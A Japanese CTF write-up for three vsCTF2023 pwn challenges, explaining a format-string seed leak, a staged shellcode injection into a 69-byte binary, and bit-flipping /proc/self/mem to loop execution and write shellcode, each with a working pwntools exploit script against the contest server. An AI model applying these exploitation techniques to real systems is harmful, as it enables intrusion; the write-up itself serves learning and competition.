# 出た

[vsCTF2023](https://ctf.viewsource.me/)

# 解いた

- Pwn
  - RPS
  - Tiny-Pwn
  - Cosmic Ray v2

# RPS

urandom から取ってきた 4 バイトを seed にして 50 回じゃんけんに勝てばフラグがもらえる。

名前入力に FSB があるので適当にリークして 50 勝つコードを掛けば良い。

exploit.py

```python
from pwn import *
import json
from c_rand import *

binary = ELF("./rps", checksec=True)
binary_rop = ROP(binary)

context.log_level = "info"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.os = "linux"
context.bits = 64

hands = ["r", "p", "s"]

def beat(hand: str) -> str:
    if hand == "p":
        return "s"
    elif hand == "r":
        return "p"
    elif hand == "s":
        return "r"


def exploit():
    # io = gdb.debug("./rps")
    io = remote("vsc.tf", 3094)

    io.sendline(b"%9$x")
    io.readuntil(b"Hi ")
    seed = int(io.readline(), 16)

    success(f"got seed {hex(seed)}")

    srand(seed)

    for i in range(50):
        r = rand()
        info(f"rand {r}")
        expect = hands[r % 3]
        info(f"expect {expect}")

        io.sendlineafter(b": ", beat(expect).encode())
        info(f"send {beat(expect)}")

        got = io.readline()
        info(f"got {got}")

    io.interactive()

    pass


if __name__ == "__main__":
    exploit()

```

# Tiny-Pwn

69 バイトしか無い謎の 32bit バイナリが与えられる。
実行はできるが、そのままでは gdb での実行もできないためディスアセンブルすらできない。

そのまま実行すると、入力を受け付けたあと SIGSEGV が帰ってきたり SIGILL が帰ってきたりする。入力文字列を機械語にして実行していそう。

バイナリエディタで開き、目で ELF をパースすると、entry が 0x34 で雰囲気的にも機械語が始まっていそうな感じがする。そこを逆アセンブルする。

```python
context.arch = "x86"
context.os = "linux"
context.bits = 32

def exploit():
    with open("./tinypwn", "rb") as f:
        content = f.read()

    """ELF HEADER
    typedef struct elf_header{
       char e_ident[16];
       short e_type;
       short e_machine;
       int e_version;
       int e_entry;
       ...
    }
    """

    program_start_offset = 16 + 2 + 2 + 4
    program_start = (
        unpack(content[program_start_offset : program_start_offset + 4]) & 0xFF
    )

    got = disasm(content[program_start:])
    info(f"{got}")
```

を実行して、

```plaintext
        push   0x3
        pop    eax
        mov    ebx, 0x0
        mov    ecx, esp
        push   0xd
        pop    edx
        int    0x80
        jmp    esp
```

が得られる。$esp$に入力を書き込んで実行している。`0xd`バイトしかシェルコードを送れないので工夫が必要。

`read`システムコールは$eax$レジスタの値と$edx$の値だけ変えるので$eax$に 3 を、$edx$に適当な長いバッファ長を指定しもう一度`int 0x80`を発火させる。

$esp$から少し進んでしまっている場所から$esp$に書き込むので、最初は少し$nop$でスプレーしつつその後シェルコードを書き込めばシェルゲット。

```python
context.arch = "x86"
context.os = "linux"
context.bits = 32
def exploit():
    target = """
        push   0x3
        pop    eax
        mov    ebx, 0x0
        mov    ecx, esp
        push   0xd
        pop    edx
        int    0x80
        jmp    esp
    """

    # io = gdb.debug_assembly(target)
    io = remote("vsc.tf", 3026)

    injection = """
        push 0x3
        pop eax
        push 0x1000
        pop edx
        int 0x80
    """
    payload = asm(injection)
    assert len(payload) <= 0xD

    io.send(payload)

    staged = asm("nop") * 100 + asm(shellcraft.sh())
    io.send(staged)

    io.interactive()
```

# Cosmic Ray v2

PIE 以外のセキュリティ機能がついたバイナリが与えられる。

アドレスを入力すると、`"/proc/self/mem"` を開いてその場所にある 1byte を教えてくれる。
次に、その 1 バイトのうち好きなビットを 1 つ反転させて `"/proc/self/mem"` に書き戻す。

これらの操作が 1 回だけ可能で、問題名通り中性子線っぽいことができる。

一回では流石に何もできないので、どうにかして何度も書き換えられるようにしたい。
`"/proc/self/mem"`はメモリの権限などは関係なく書き込みが可能なので、text 領域の書き換えて実現できそう。

ジャンプ命令のオフセットを書き換えてこれを行う。以下の部分に注目した。

```plaintext
pwndbg> x/10i &cosmic_ray+490
   0x4015d8 <cosmic_ray+490>:   sub    rax,QWORD PTR fs:0x28
   0x4015e1 <cosmic_ray+499>:   je     0x4015e8 <cosmic_ray+506>
   0x4015e3 <cosmic_ray+501>:   call   0x401120 <__stack_chk_fail>
   0x4015e8 <cosmic_ray+506>:   leave
   0x4015e9 <cosmic_ray+507>:   ret
   0x4015ea <main>:     endbr64
   0x4015ee <main+4>:   push   rbp
   0x4015ef <main+5>:   mov    rbp,rsp
   0x4015f2 <main+8>:   mov    rax,QWORD PTR [rip+0x2a27]        # 0x404020 <stdout@GLIBC_2.2.5>
   0x4015f9 <main+15>:  mov    esi,0x0
```

```plaintext
pwndbg> x/10x 0x4015e1
0x4015e1 <cosmic_ray+499>:      0x38e80574      0xc9fffffb      0x1e0ff3c3      0x894855fa
0x4015f1 <main+7>:      0x058b48e5      0x00002a27      0x000000be      0xc7894800
0x401601 <main+23>:     0xfffb2ae8      0x058b48ff
```

`cosmic_ray+499`にある`je 7`という命令は、$rip$から+7 した先に移動する命令である。エンディアンに注意してこの機械語を確認すると $0574$ という部分が該当する。

Intel Software Developer's Manual の 3-548 Vol. 2A にその説明がある。オフセットの`5`というのは、自身の命令(長さ`2`)が終わってからのオフセットだからと考えれば良い。

この`5`という値の`2`bit 目を書き換えればちょうどぴったり`je main`という命令に変化する。が、これは`rsp`のアラインメントの関係でうまく行かなかったので 4 ビット目を書き換え、`je main+6`とした。

ちなみに、実際に exploit を書く時は下位ビットが 7 で上位ビットが 0 なので注意。

さて、これで何度も書き換えられるようになったので、`main`内の`call cosmic_ray`のあとの命令をシェルコードに置き換えていく。最後にさっき書き換えた`je`命令の 4 ビット目を反転させれば`main`に戻ってきたときに発火する。

1 ビットずつなのでリモートに適用する時は実行に 2 分ほどかかるが、これでシェルが取れる。

exploit.py

```python
binary = ELF("./cosmicrayv2", checksec=True)

context.arch = "amd64"
context.os = "linux"
context.bits = 64

def send_address(io: tube, address: int):
    io.sendlineafter(b"ray through:", hex(address).encode())


def flip(io: tube, val: int):
    assert 0 <= val < 8
    io.sendlineafter(b"flip:", str(val).encode())


def write_byte(io: tube, address: int, val: int):
    assert 0 <= val < 256

    send_address(io, address)
    io.readuntil(b"-----------------\n")
    values = list(map(int, io.readline().decode().split("|")[1:-1]))

    byte = 0
    for i, v in enumerate(reversed(values)):
        byte |= v << i

    flip_val = byte ^ val

    if flip_val == 0:
        flip(io, 0)
        send_address(io, address)
        flip(io, 0)
        return

    flip_target = []
    for i in range(8):
        if flip_val & (1 << i):
            flip_target.append(i)

    flip(io, 7 - flip_target[0])
    for i in flip_target[1:]:
        send_address(io, address)
        flip(io, 7 - i)


def query_bytes(io: tube, address: int, byte: bytes):
    for i, b in enumerate(byte):
        write_byte(io, address + i, b)
        success(f"wrote {hex(b)} to {hex(address + i)}")


def toggle_cosmic_or_main(io: tube):
    jmp_address = binary.symbols["cosmic_ray"] + 499 + 1

    send_address(io, jmp_address)
    flip(io, 4)


def exploit():
    # io = gdb.debug("./patched", exe="./cosmicrayv2_dbg")
    io = remote("vsc.tf", 3047)

    toggle_cosmic_or_main(io)
    # reenter to main

    # write shell code
    query_bytes(io, binary.symbols["main"] + 58, asm(shellcraft.sh()))

    toggle_cosmic_or_main(io)
    # return to main

    success("you got real world")
    io.interactive()
```

# 所感

面白い
